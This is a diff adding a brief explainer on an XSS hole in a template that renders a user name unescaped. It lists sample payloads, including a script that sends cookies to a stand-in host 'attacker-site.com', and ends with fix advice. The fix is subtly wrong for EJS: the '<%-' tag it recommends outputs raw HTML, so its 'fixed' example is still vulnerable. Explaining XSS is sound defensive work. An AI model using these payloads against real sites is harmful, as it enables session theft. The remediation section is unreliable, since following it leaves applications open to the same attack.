@@ -1,0 +1,32 @@
+The provided code is vulnerable to Cross-Site Scripting (XSS) because it outputs user-provided data (userName) directly into the HTML without sanitization. Here are some examples of malicious inputs that could exploit this vulnerability:
+
+Malicious XSS Inputs:
+Script Injection:
+<script>alert('XSS Vulnerability!')</script>
+This will execute a JavaScript alert when the page renders.
+
+HTML Injection:
+<img src="x" onerror="alert('XSS')">
+This injects an image tag with an invalid source. The onerror handler executes JavaScript.
+Event Handler Injection:
+
+<div onmouseover="alert('XSS')">Hover over me</div>
+Injects a div element with a mouseover event handler that triggers an alert.
+
+Attribute Injection:
+"><script>alert('XSS')</script>
+Closes the attribute and injects a malicious script.
+
+Redirect or Phishing Attack:
+<a href="http://malicious-site.com">Click me</a>
+Injects a link to a malicious site.
+
+Stored XSS Payload (if input is stored in a database):
+<script>document.location='http://attacker-site.com?cookie='+document.cookie;</script>
+Steals cookies or sensitive data.
+
+How to Fix the Vulnerability
+Escape User Input: Use <%- escape(userName) %> (in the case of EJS) to properly escape HTML characters.
+Example: Hello, <%- userName %>!
+Sanitize User Input: Use a library like DOMPurify or a similar server-side sanitizer to clean user input before rendering it.
+Use CSP (Content Security Policy): Implement a strong CSP to limit which scripts can execute on your website.
